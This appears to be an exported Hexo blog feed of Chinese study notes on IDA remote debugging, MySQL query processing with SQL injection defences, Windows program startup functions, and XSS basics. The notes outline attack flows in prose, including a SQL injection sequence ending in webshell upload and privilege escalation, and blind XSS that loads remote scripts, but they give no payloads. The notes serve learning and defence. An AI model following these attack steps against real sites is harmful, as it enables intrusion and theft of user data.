<li>随后，IDA会创建一个数据库（保存在被调试程序所在目录下），其组件分别保序存在扩展名为<code>.id0</code>、<code>.id1</code>、<code>.nam</code>和<code>.til</code>的4个文件里，这些文件的格式为IDA专用，在关闭当前项目下时，这4个文件将被存档为一个<code>idb</code>文件。一旦IDA创建了数据库，就不需要再访问这个可执行文件了，除非使用IDA的集成调试器调试这个可执行文件本身。再次分析该目标文件时，IDA只需要打开现有数据库，就会将界面恢复为上次关闭时的状态。</li>
</ol>
<h3 id="2-1-IDA远程调试配置PDB文件"><a href="#2-1-IDA远程调试配置PDB文件" class="headerlink" title="2.1 IDA远程调试配置PDB文件"></a>2.1 IDA远程调试配置PDB文件</h3><ol>
<li><p>找到IDA下远程服务端文件所在目录：<code>/Users/alxxx/Documents/IDA_PRO_7/dbgsrv </code>下对应版本，因为要调试的目标文件是<code>ntkrnlpa.exe</code>，我选的是<code>win32_remote.exe</code>。将其复制到Win 7 Pro SP1的虚拟机中。</p>
</li>
<li><p>由于Win 7 Pro SP1已经安装了<code>C:\Windows\Symbols</code>，配置符号文件的环境变量：</p>
<ul>
<li>系统变量：在<code>Path</code>后添加<code>C:\Apps\Symbols\exe\</code>。</li>
<li>在用户变量下添加键值对：变量名：<code>_NT_SYMBOL_PATH</code>，变量值<code>C:\Apps\Symbols\exe</code>。</li>
</ul>
</li>
<li><p>将Win XP的<code>ntkrnlpa.pdb</code>复制到<code>C:\Windows\Symbols\exe</code>文件夹下。</p>
</li>
<li><p>然后双击运行<code>win32_remote.exe</code>。</p>
</li>
<li><p>在IDA PRO中：<code>File --&gt; Load file --&gt; PDB file --&gt; 如下图1 --&gt; 到Win 7中看win32_remote.exe给出的IP地址 --&gt; 如下图2</code>。</p>
<p><img data-src="https://s2.loli.net/2022/03/28/tChuBwYOj71vdV9.png" alt="36.png"></p>
<p><img data-src="https://s2.loli.net/2022/03/28/fTRBapMuLsq82OD.png" alt="37.png"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>笔记</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/post/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>数据库编译原理和注入</title>
    <url>/post/sqlinject/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ (๑˃̵ᴗ˂̵) ପ( ˘ᵕ˘ ) ੭ </p>
<span id="more"></span>

<h2 id="1-数据库预编译"><a href="#1-数据库预编译" class="headerlink" title="1 数据库预编译"></a>1 数据库预编译</h2><p><img data-src="https://i.loli.net/2020/12/30/kbGSjUODZKYy4iF.png" alt="20171109112918970.png"></p>
<p><img data-src="https://i.loli.net/2020/12/30/mVAI8zLNaWfwe1b.png" alt="11.png"></p>
<p><img data-src="https://i.loli.net/2020/12/30/UJCz2LBFhXfZq9n.png" alt="20180712121912586.png"></p>
<div class="note warning"><p>MySQL查询执行路径 </p>
<ol>
<li>客户端发送一条查询给服务器； </li>
<li>服务器先会检查查询缓存，如果命中了缓存，则立即返回存储在缓存中的结果。否则进入下一阶段； </li>
<li>服务器端进行SQL解析、预处理，再由优化器生成对应的执行计划； </li>
<li>MySQL根据优化器生成的执行计划，调用存储引擎的API来执行查询； </li>
<li>将结果返回给客户端。</li>
</ol>
</div>

<h3 id="1-1-查询高速缓存（library-cache）"><a href="#1-1-查询高速缓存（library-cache）" class="headerlink" title="1.1 查询高速缓存（library cache）"></a>1.1 查询高速缓存（library cache）</h3><p>服务器进程在接到客户端传送过来的 SQL 语句时，不会直接去数据库查询。而是会先在数据库的高速缓存中去查找，是否存在相同语句的执行计划。如果在数据高速缓存中，则服务器进程就会直接执行这个 SQL 语句，省去后续的工作。所以，采用高速数据缓存的话,可以提高 SQL 语句的查询效率。<strong>一方面是从内存中读取数据要比从硬盘中的数据文件中读取数据效率要高</strong>，另一方面，也是因为这个语句解析的原因。</p>
<p>如果当前的查询恰好命中了查询缓存，那么在返回查询结果之前 MySQL 会检查一次用户权限。这仍然是无须解析查询 SQL 语句的，因为在查询缓存中已经存放了当前查询需要访问的表信息。如果权限没有问题，MySQL 会跳过所有其他阶段，直接从缓存中拿到结果并返回给客户端。这种情况下，查询不会被解析，不用生成执行计划，不会被执行。</p>
<p>不过这里要注意一点，这个数据缓存跟有些客户端软件的数据缓存是两码事。有些客户端软件为了提高查询效率,会在应用软件的客户端设置数据缓存。由于这些数据缓存的存在,可以提高客户端应用软件的查询效率。但是，若其他人在服务器进行了相关的修改，由于应用软件数据缓存的存在,导致修改的数据不能及时反映到客户端上。从这也可以看出，应用软件的数据缓存跟数据库服务器的高速数据缓存不是一码事。</p>
<h3 id="1-2-语法解析器"><a href="#1-2-语法解析器" class="headerlink" title="1.2 语法解析器"></a>1.2 语法解析器</h3><p><strong>ANTLR</strong>—Another Tool for Language Recognition，其前身是PCCTS，它为包括Java，C++，C#在内的语言提供了一个通过语法描述来自动构造自定义语言的识别器（recognizer），编译器（parser）和解释器（translator）的框架。</p>
<mark class="label danger">词法分析器（Parser）</mark>： 词法分析器又称为 Scanner，Lexical analyser 和 Tokenizer。程序设计语言通常由关键字和严格定义的语法结构组成。编译的最终目的是将程序设计语言的高层指令翻译成物理机器或虚拟机可以执行的指令。词法分析器的工作是分析量化那些本来毫无意义的字符流，将他们翻译成离散的字符组（也就是一个一个的Token），包括关键字，标识符，符号（symbols）和操作符供语法分析器使用。 

<p> 词法分析阶段是编译过程的第一个阶段。这个阶段的任务是从左到右一个字符一个字符地读入源程序，即对构成源程序的字符流进行扫描然后根据构词规则识别单词（也称单词符号或符号）。</p>
<mark class="label danger">语法分析器（Parser）</mark>： 编译器又称为 Syntactical analyser。在分析字符流的时候，Lexer 不关心所生成的单个 Token 的语法意义及其与上下文之间的关系，而这就是 Parser 的工作。语法分析器将收到的 Tokens 组织起来，并转换成为目标语言语法定义所允许的序列。

<p>语法分析是编译过程的一个逻辑阶段。语法分析的任务是在词法分析的基础上将单词序列组合成各类语法短语，如<mark class="label danger">程序</mark>，<mark class="label default">语句</mark>，<mark class="label warning">表达式</mark>等等。语法分析程序判断源程序在结构上是否正确。源程序的结构由上下文无关文法描述。</p>
<p> 无论是 Lexer 还是 Parser 都是一种识别器，Lexer 是字符序列识别器而 Parser 是 Token 序列识别器。他们在本质上是类似的东西，而只是在分工上有所不同而已。</p>
<h3 id="1-3-预处理"><a href="#1-3-预处理" class="headerlink" title="1.3 预处理"></a>1.3 预处理</h3><mark class="label danger">预处理</mark>：也叫做<mark class="label info">语义分析</mark>，预处理由预处理器来完成，预处理器则根据一些 MySQL 规则进一步检查解析树是否合法，例如，这里讲检查数据表和数据列是否存在，还会解析名字和别名，看看它们是否有歧义。

<p>语言含义检查（Data Dict Cache)。若 SQL 语句符合语法上的定义的话，则服务器进程接下去会<strong>对语句中的字段、表等内容进行检查，看看这些字段、表是否在数据库中</strong>。如果表名与列名不准确的话，则数据库会就会反馈错误信息给客户端。所以，有时候我们写 select 语句的时候，若语法与表名或者列名同时写错的话，则系统是先提示说语法错误，等到语法完全正确后，再提示说列名或表名错误。</p>
<p>对合法的查询语句进行语义查询，即根据数据字典中有关的模式定义检查语句中的数据库对象（关系名、属性名）是否存在和有效。如果是对视图的操作，要用视图消解方法把对视图的操作转换成对基本表的操作。还要根据数据字典中的用户权限和完整性约束定义对用户的存取权限进行检查。如果对该用户没有相应的防伪权限或违反了完整性约束，就拒绝执行该查询。当然，这时的完整性检查是初步、静态的检查。检查通过后便把 SQL 查询语句转换成内部表示，即等价的关系代数表达式。这个过程中要把数据库对象的外部名称转换为内部表示。关系数据库管理系统一般都用查询树，也称为语法分析树来表示扩展的关系代数表达式。</p>
<p>关键点：</p>
<ol>
<li>SQL解析包括语法分析器和词法分析器。<br>简便的做法是用 bison&#x2F;flex 组合。不过MySQL的词法分析器是手工打造的。<br>语法分析器的入口函数是 MYSQLparse，词法分析器的入口函数是 MYSQLlex。</li>
<li><strong>词法分析中会检查 token 是否为关键字</strong>。<br>最直接的做法是弄个大的关键字数组，进行折半查找。MySQL 在此做了些优化。<br>本文主要介绍的是这一部分。</li>
</ol>
<ul>
<li>【<a href="https://blog.imaginea.com/mysql-query-parsing/">MySQL: Query Parsing</a>】</li>
<li>【<a href="https://zhuanlan.zhihu.com/p/199563594">揭秘：一条SQL语句的执行过程是怎么样的？</a>】</li>
<li>【<a href="https://blog.csdn.net/qq_22860341/article/details/78487812">SQL查询执行流程</a>】</li>
<li>【<a href="https://blog.csdn.net/weixin_39164332/article/details/89003624">MySQL-词法分析</a>】</li>
<li>【<a href="https://www.cnblogs.com/BlogNetSpace/p/5108845.html">词法分析、语法分析、语义分析</a>】</li>
<li>【<a href="https://blog.csdn.net/pentiumCM/article/details/106076655">SQL - 词法&#x2F;语法分析各种方案总结</a>】</li>
<li>【<a href="https://wenku.baidu.com/view/70feb67c5acfa1c7aa00ccb1.html">数据库查询语言SQL的语法分析及实现</a>】</li>
<li>【<a href="https://www.cnblogs.com/yuyue2014/p/3826941.html">MySQL查询执行过程</a>】</li>
<li>【<a href="https://blog.csdn.net/weixin_45505313/article/details/106540525">MySQL 查询执行的流程</a>】</li>
<li>【<a href="https://blog.csdn.net/lxw983520/article/details/80998601">关系数据库的查询处理</a>】</li>
<li>【<a href="https://www.codenong.com/cs105914369/">数据库—关系查询处理和查询优化</a>】</li>
<li>【<a href="https://blog.csdn.net/eagle89/article/details/80829486">查询执行流程-&gt;SQL解析顺序</a>】</li>
</ul>
<h3 id="1-4-权限检查"><a href="#1-4-权限检查" class="headerlink" title="1.4 权限检查"></a>1.4 权限检查</h3><p>数据访问权限的核对。当语法、语义通过检查之后，客户端还不一定 能够取得数据。服务器进程还会检查，你所连接的用户是否有这个数据访问的权限。若你连接上服务器的用户不具有数据访问权限的话，则客户端就不能够取得这些数据。有时候我们查询数据的时候，辛辛苦苦地把 SQL 语句写好、编译通过，但是最后系统返回 “没有权限访问数据”的错误信息，则半途而废。</p>
<h3 id="1-5-查询优化和执行计划生成"><a href="#1-5-查询优化和执行计划生成" class="headerlink" title="1.5 查询优化和执行计划生成"></a>1.5 查询优化和执行计划生成</h3><p>查询优化器现在语法树被认为合法的了，并且由优化器将其转化为执行计划。一条查询可以由很多种执行方式，最后都返回相同的结果。优化器的作用就是找到这其中最好的执行计划。 </p>
<p>在查询优化阶段，MySQL 将生成查询对应的执行计划。</p>
<p>MySQL 使用基于成本的优化器，它将尝试预测一个查询使用某种执行计划的成本，并选择其中成本最小的一个。最初，成本的最小单位是随机读取一个<code>4K</code>数据页的成本，后来成本计算公式变得更加复杂，并且引入了一些“因子”来估算某些操作的代价，如当执行一次<code>where</code>条件比较的成本。可以通过查询当前会话的<code>last_query_cost</code>的值来得知 MySQL 计算的当前查询的成本。 有很多种原因会导致 MySQL 优化器选择错误的执行计划，比如： </p>
<ol>
<li>统计信息不准确。 </li>
<li>执行计划中的成本估算不等同于实际的执行计划的成本。 </li>
<li>MySQL 的最优可能与你想的最优不一样。 </li>
<li>MySQL 从不考虑其他并发的查询，这可能会影响当前查询的速度。 </li>
<li>MySQL 也不是任何时候都是基于成本的优化，有时候也会基于一些固定的规则。 </li>
<li>MySQL 不会考虑不受其控制的成本，例如执行存储过程或者用户自定义的函数的成本。</li>
</ol>
<p>MySQL 的查询优化使用了很多优化策略来生成一个最优的执行的计划。优化策略可以分为两种，静态优化和动态优化。静态优化可以直接对解析树进行分析，并完成优化。例如优化器可以通过一些简单的代数变换将<code>where</code>条件转换成另一种等价形式。静态优化不依赖于特别的数值，如<code>where</code>条件中带入的一些常数等。静态优化在第一次完成后就一直有效，即使使用不同的参数重复查询也不会变化，可以认为是一种“编译时优化”。 相反，动态优化则和查询的上下文有关。也可能和很多其他因素有关，例如<code>where</code>条件中的取值、索引中条目对应的数据行数等，这些需要每次查询的时候重新评估，可以认为是“运行时优化”。</p>
<ul>
<li>静态优化<br>直接对解析树进行分析，并完成优化。例如优化器可以通过一些简单的代数变换将 where 条件转换成另一种等价形式。静态优化不依赖于特别的数值，如 where 条件中带入的一些常数等。静态优化在第一次完成后就一直有效，即使使用不同的参数重复查询也不会变化，可以认为是一种编译时优化</li>
<li>动态优化<br>动态优化与查询的上下文有关，也可能和很多其他因素有关，例如 where 条件中的取值、索引中条目对应的数据行数等，这些每次查询的时候都需要重新评估，可以认为是运行时优化</li>
</ul>
<h3 id="1-6-查询执行引擎"><a href="#1-6-查询执行引擎" class="headerlink" title="1.6 查询执行引擎"></a>1.6 查询执行引擎</h3><p>在解析和优化阶段，MySQL将生成查询对应的执行计划，MySQL的查询执行引擎则根据这个执行计划来完成整个查询。这里执行计划是一个数据结构，而不是和很多其他的关系型数据库那样会生成对应的字节码。</p>
<p>相对于查询优化阶段，查询执行阶段不是那么复杂：MySQL只是简单的根据执行计划给出的指令逐步执行。在根据执行计划逐步执行的过程中，有大量的操作需要通过调用存储引擎实现的接口来完成，这些接口就是我们称为<code>handler API</code>的接口。实际上，MySQL在优化阶段就为每个表创建了一个handler实例，优化器根据这些实例的接口可以获取表的相关信息，包括表的所有列名、索引统计信息等。</p>
<h3 id="1-7-返回结果给客户端"><a href="#1-7-返回结果给客户端" class="headerlink" title="1.7 返回结果给客户端"></a>1.7 返回结果给客户端</h3><p>查询执行的最后一个阶段是将结果返回给客户端。即使查询不需要返回结果给客户端，MySQL 仍然会返回这个查询的一些信息，如查询影响到的行数。如果查询可以被缓存，那么 MySQL 在这个阶段，会将结果存放到查询缓存中。MySQL 将结果返回客户端是一个增量、逐步返回的过程。例如，在关联表操作时，一旦服务器处理完最后一个关联表，开始生成第一条结果时，MySQL就可以开始向客户端逐步返回结果集了。这样处理有两个好处：服务器无需存储太多的结果，也就不会因为要返回太多的结果而消耗太多的内存。另外，这样的处理也让 MySQL 客户端第一时间获得返回的结果。结果集中的每一行都会以一个满足 MySQL 客户端&#x2F;服务器通信协议的封包发送，再通过 TCP 协议进行传输，在 TCP 传输过程中，可能对 MySQL 的封包进行缓存然后批量传输。</p>
<h2 id="2-预编译防御SQL注入"><a href="#2-预编译防御SQL注入" class="headerlink" title="2 预编译防御SQL注入"></a>2 预编译防御SQL注入</h2><p><img data-src="https://i.loli.net/2020/12/31/qe2tadnFjOmxPEK.png" alt="Snip20201231_13.png"></p>
<p>学习总结SQL注入的防范原理</p>
<ol>
<li><p>一般的注入分类：数字型、字符型、GET注入、POST注入、Cookie注入、HTTP头部注入、基于布尔的注入、基于时间的注入、基于报错的注入、联合查询注入、堆查询注入、宽字节注入。</p>
<p>我总结将其分类两个大类：回显注入（注入过程中前端能看到回显内容）、盲注（注入过程中前端不能看到回显内容），而把其他分类归结为使用的注入方法。</p>
</li>
<li><p>典型的攻击流程如下：</p>
<ol>
<li>判断 Web 系统使用的脚本语言，发现注人点，并确定是否存在 SQL 注人漏洞。</li>
<li>判断 Web 系统的数据库类型。</li>
<li>判断数据库中表及相应字段的结构。</li>
<li>构造注入语句，得到表及相应字段的结构表中数据内容。</li>
<li>查找网站后台管理员，用得到的管理员账号和密码登录。</li>
<li>结合其他漏洞，上传Webshell并持续连接（留后门）。</li>
<li>进一步提权，得到服务器的系统权限。</li>
</ol>
</li>
<li><p>防御方法：</p>
<ul>
<li>早期的常规方法和现在一些中小型企业的网站使用的防范方式是在服务器做SQL代码过滤、安全编码、字符转义、字符替换、参数类型限制、参数长度限制、使用正则表达式等，往往达不到预期的防范效果。</li>
<li>目前相对成熟的防范方法是在代码层使用开发框架、数据库预编译之后参数化查询、使用存储过程、URL重写，在网络架构上使用WAF和防火墙等设备。还有一些目前研究先进的防御方法，如基于改进的模式匹配算法、污点分析算法、机器学习、抽象语法树的SQL防范技术等。</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>MYSQL注入</category>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>知识笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>博客主题更新</title>
    <url>/post/updatetheme/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="235a0fe11db42a1d83a1edd58c70eec0b6479aa9bacf56e76c1e035919d27388"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>启动函数和入口函数</title>
    <url>/post/translater-start-entry-function/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<p><img data-src="https://img.shields.io/badge/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E3%80%8AC++%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E8%A7%A3%E5%AF%86%EF%BC%88%E7%AC%AC%E4%B8%80%E7%89%88%EF%BC%89%E3%80%8B-1fd0f6.svg?colorA=ff69b4"></p>
<p><img data-src="https://img.shields.io/badge/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E3%80%8AWindows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B%EF%BC%88%E7%AC%AC%E4%BA%94%E7%89%88%EF%BC%89%E3%80%8B-1fd0f6.svg?colorA=ff69b4"></p>
<h2 id="1-程序的启动函数和入口函数"><a href="#1-程序的启动函数和入口函数" class="headerlink" title="1 程序的启动函数和入口函数"></a>1 程序的启动函数和入口函数</h2><div class="note default"><p>Windows支持两种类型的应用程序：</p>
<ul>
<li><strong>GUI</strong>：图形化应用程序（图形用户界面程序）</li>
<li><strong>CUI</strong>：控制台应用程序（控制台用户界面程序）</li>
</ul>
</div>

<p><strong><code>main</code>、<code>Winmain</code>函数被称为入口函数，入口函数被调用前，会先运行启动函数，然后由启动函数来调用入口函数。</strong></p>
<p>启动函数和入口函数在多字节编码（ANSI）和Unicode编码环境下是不一样的，具体对应关系如下：</p>
<p><img data-src="https://i.loli.net/2021/11/18/fplLEeshwGWT9Vz.png" alt="4.png"></p>
<p>也可指定&#x2F;移除链接器开关（如果移除链接器开关，程序将会自动判断子系统），VS中设置如下：</p>
<ul>
<li><code>/SUBSYSTEM:WINDOWS</code></li>
<li><code>/SUBSYSTEM:CONSOLE</code></li>
</ul>
<p><strong>入口函数</strong>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">int</span> WINAPI _tWinMain(</span><br><span class="line">	HINSTANCE hInstanceExe, </span><br><span class="line">	HINSTANCE,</span><br><span class="line">	PTSTR pszCmdline,</span><br><span class="line">	<span class="keyword">int</span> nCmdShow);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(</span><br><span class="line">	<span class="keyword">int</span> argc,</span><br><span class="line">	TCHAR *argv[],</span><br><span class="line">	TCHAR *envp[]);</span><br></pre></td></tr></table></figure>

<p><strong>启动函数</strong>：</p>
<ol>
<li>启动函数由KERNEL32.dll中的<code>KERNEL32</code>函数调用，我们无法查看KERNEL32.dll的源码。</li>
<li>VC++自带<a href="https://www.cnblogs.com/renyuan/p/5031100.html">C运行库</a>的源代码，可以在<code>crtexe.c</code>中找到这4个启动函数的源代码。</li>
</ol>
<h2 id="2-CUI程序"><a href="#2-CUI程序" class="headerlink" title="2 CUI程序"></a>2 CUI程序</h2><div class="note warning"><p><strong>调用顺序：</strong><mark class="label default"><code>KERNEL32</code> --&gt; <code>mainCRTStartup</code> --&gt; <code>main</code>。</mark></p>
</div>

<h3 id="2-1-启动函数"><a href="#2-1-启动函数" class="headerlink" title="2.1 启动函数"></a>2.1 启动函数</h3><div class="note danger"><p>启动函数工作流程：</p>
<ol>
<li><p><mark class="label danger">GetVersion() ：</mark><mark class="label success">获取当前运行平台的版本号</mark>。控制台程序运行在Windows模拟的DOS下，因此这里获取的版本号为MS-DOS的版本信息。</p>
</li>
<li><p><mark class="label danger">_heap_init() ：</mark><mark class="label success">用于初始化堆空间</mark>。在函数实现中使用<code>HeapCreate</code>申请堆空间，申请空间的大小由<code>_heap_init</code>传递的参数决定。<code>_sbh_heap_init</code>函数用于初始化堆结构信息。堆结构的说明将在第7章详细讲解。</p>
</li>
<li><p><mark class="label danger">GetCommandLineA() ：</mark><mark class="label success">获取命令行参数信息的首地址。</mark></p>
</li>
<li><p><mark class="label danger">_crtGetEnvironmentStringsA：</mark><mark class="label success">获取环境变量信息的首地址。</mark></p>
</li>
<li><p><mark class="label danger">_setargv() ：</mark><mark class="label success">参数分析。</mark>此函数根据<code>GetCommandLineA()</code>获取命令行参数信息的首地址并进行参数分析，将分离出的参数的个数保存在全局变量<code>_argc</code>中，将分析出的每个命令行参数的首地址存放在数组中，并将这个字符指针数组的首地址保存在全局变量<code>_argv</code>中。这样就得到了命令行参数的个数，以及命令行参数信息。</p>
</li>
<li><p><mark class="label danger">_setenvp() ：</mark><mark class="label success">环境变量分析。</mark>此函数根据<code>_crtGetEnvironmentStringsA</code>函数获取环境变量信息的首地址并进行分析，将得到的每条环境变量字符串的首地址存放在字符指针数组中，并将这个数组的首地址存放在全局变量<code>env</code>中。</p>
</li>
<li><p><mark class="label danger">_cinit() ：</mark><mark class="label success">用于全局数据和浮点寄存器的初始化。</mark>全局对象和IO流等的初始化都是通过这个函数实现的。利用函数<code>_initterm</code>进行数据链初始化，这个函数由两个参数组成，类型为<code>_PVFV*</code>，这是一个函数指针数组，其中保留了每个初始化函数的地址。初始化函数的类型为<code>_PVFV</code>，其定义原型如下：</p>
<p><code>typedef void (_cdecl *_PVFV) (void);</code></p>
</li>
</ol>
</div>





<h3 id="2-2-入口函数"><a href="#2-2-入口函数" class="headerlink" title="2.2 入口函数"></a>2.2 入口函数</h3><p>1</p>
<h2 id="3-GUI程序"><a href="#3-GUI程序" class="headerlink" title="3 GUI程序"></a>3 GUI程序</h2><h3 id="3-1-启动函数"><a href="#3-1-启动函数" class="headerlink" title="3.1 启动函数"></a>3.1 启动函数</h3><h3 id="3-2-入口函数"><a href="#3-2-入口函数" class="headerlink" title="3.2 入口函数"></a>3.2 入口函数</h3>]]></content>
      <categories>
        <category>笔记</category>
        <category>逆向</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Web 安全防护指南基础篇-XSS攻击</title>
    <url>/post/web-basic-safety-guide-xss/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ (๑˃̵ᴗ˂̵) ପ( ˘ᵕ˘ ) ੭ </p>
<span id="more"></span>

<h2 id="1-XSS攻击原理"><a href="#1-XSS攻击原理" class="headerlink" title="1 XSS攻击原理"></a>1 XSS攻击原理</h2><p>存在 XSS 攻击的地方一般为：评价功能、论坛私信、留言、在线信箱….</p>
<p>一般分类为：</p>
<ul>
<li>反射型跨站攻击： 浏览器---服务器交互</li>
<li>存储型跨站攻击：浏览器---服务器---数据库交互</li>
<li>DOM型跨站攻击：浏览器---服务器交互</li>
</ul>
<p>可以实现：获取用户 Cookie、进行内网探测、弹出广告等。</p>
<p>上传的业务流程如下图：</p>
<p><img data-src="https://i.loli.net/2021/01/06/ed2BOUiwWj1yXcn.png" alt="屏幕快照 2021-01-06 下午1.25.46.png"></p>
<div class="note default"><p>其中两个关键点是：</p>
<ul>
<li><mark class="label default">入库处理</mark>：攻击脚本需存储在数据库中，可供当前应用的使用者读取。</li>
<li><mark class="label default">出库处理</mark>：由当前功能的使用者按照正常的业务流程从数据库中读取信息，这时攻击脚本即开始执行。</li>
</ul>
</div>

<div class="note warning"><p>XSS 攻击成功必须满足以下四个条件：</p>
<p>（1）入库处理</p>
<ol>
<li>目标网页有攻击者<strong>可控的输人点</strong>。</li>
<li>输人信息可以在受害者的浏览器中显示。</li>
<li>输入具备功能的可执行脚本，且在信息输入和输出的过程中没有特殊字符的过滤和字符转义等防护措施，或者说防护措施可以通过一定的手段绕过。</li>
</ol>
<p>（2）出库处理</p>
<ol start="4">
<li>浏览器将输入解析为脚本，并具备执行该脚本的能力。</li>
</ol>
</div>

<p>如果要实现一个 XSS 存储型跨站攻击，<strong>以上四点缺一不可</strong>。如果需要做针对 XSS 攻击的防御，只要针对上述任何一点做好防御，攻击就无法正常开展，XSS 漏洞也就不存在了。</p>
<p><strong>总结</strong></p>
<p>作为攻击者，如果要利用存储型跨站漏洞攻击，则先要将攻击脚本存储在服务器端，并且保证攻击脚本在读取后可顺利执行。当应用功能对上述条件均满足时，才可保证漏洞被成功利用。</p>
<p>作为防护者，了解到实施存储型跨站攻击的前提及必要条件后，从防护角度，可以选择禁止攻击脚本存储在数据库，即在入   库时做处理;或者对攻击脚本进行转义，避免出库时顺利执行。满足以上两种条件中的任何一个即可实现有效的防护。</p>
<h2 id="2-XSS漏洞测试流程"><a href="#2-XSS漏洞测试流程" class="headerlink" title="2 XSS漏洞测试流程"></a>2 XSS漏洞测试流程</h2><p>由于 XSS 漏洞需要使用者浏览后才可触发，某些后台需要管理员触发后才能被发现，如果用户一直不触发，漏洞就一直无法检查出来。</p>
<div class="note danger"><p>漏洞的标准挖掘思路如下：</p>
<ol>
<li>漏洞挖掘，寻找输入点。</li>
<li>寻找输出点。</li>
<li>确定测试数据输出位置。</li>
<li>输入简单的跨站代码进行测试。</li>
</ol>
</div>



<h3 id="2-1-寻找输入点"><a href="#2-1-寻找输入点" class="headerlink" title="2.1 寻找输入点"></a>2.1 寻找输入点</h3><p>一般情况下， XSS 攻击是通过“HTML注入” 方式来实现的。也就是说，攻击者通过<mark class="label info">提交参数</mark>，意图<mark class="label warning">修改当前页面的 HTML 结构</mark>。XSS 攻击成功时，提交的参数格式在当前页面<mark class="label default">拼接成可执行的脚本</mark>。可见，XSS 漏洞存在的要求就是：当前页面存在参数显示点，且参数显示点可被用户控制输入。因此，寻找用户端可控的输入点是 XSS 攻击成功的第一步。</p>
<p>在一个常规的网站中，存储型 XSS 一般发生在留言板、 在线信箱、评论栏等处，表现特征是用户可自行输入数据，并且数据会提交给服务器。通常可以通过观察页面的交互行为来确定输入点。通常情况下，要求可提交数据量至少在20字符以上，否则<code>JavaScript</code>脚本很难执行。在日常应用中，如留言板、意见反馈点、私信、文件上传信息输入框、在线提交信息、在线信箱、评论栏等功能都允许用户输人100字左右，均能达到 XSS 攻击对允许输人字符的要求。</p>
<h3 id="2-2-寻找输出位置"><a href="#2-2-寻找输出位置" class="headerlink" title="2.2 寻找输出位置"></a>2.2 寻找输出位置</h3><p>XS S攻击的受害者是访问过包含 XSS 恶意代码页面的用户，输入内容需要在用户页面上进行展示才能展开 XSS 攻击。针对一般的留言板、 评论栏系统，安全人员能根据经验轻松地判断出输出点的位置；对于一些不常见的系统，可以通过将输入内容在回显页面中进行搜索来确定输出位置。测试主要基于两个目的：</p>
<ol>
<li>确定网站对输入内容是否进行了输出，判断是否可以展开 XSS 攻击。</li>
<li>有时候需要根据输出的位置的 HTML 环境来编写有效的 XSS 代码。</li>
</ol>
<p><strong>XSS盲打后台</strong></p>
<p>指在攻击者对数据提交后展现的后台未知的情况下，网站采用了攻击者插入了带真实攻击功能的 XSS 攻击代码（通常是使用<code>script</code>标签引入远程的<code>js</code>）的数据，称作<mark class="label danger">XSS盲打</mark>。当未知后台在展现时没有对这些提交的数据进行过滤，那么后台管理人员在操作时就会触发 XSS 来实现攻击者预定好的“真实攻击功能”。</p>
